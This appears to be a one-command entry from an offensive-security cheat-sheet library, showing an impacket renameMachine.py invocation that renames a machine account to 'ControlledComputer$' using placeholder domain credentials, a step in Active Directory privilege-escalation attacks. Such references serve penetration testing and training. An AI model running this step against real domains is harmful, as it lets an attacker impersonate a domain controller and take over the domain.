---
id: f99f4731-0305-4a83-8318-9c15fc1ff2a8
name: Rename Machine
type: command
executor: bash
data: impacket@linux> renameMachine.py -current-name 'DomainController' -new-name
  'ControlledComputer$' 'domain.local'/'user':'password'
output: null
created_at: '2023-04-06T03:56:03.096993+00:00'
updated_at: '2023-04-10T20:26:11.555942+00:00'
---

# Rename Machine

```bash
impacket@linux> renameMachine.py -current-name 'DomainController' -new-name 'ControlledComputer$' 'domain.local'/'user':'password'
```


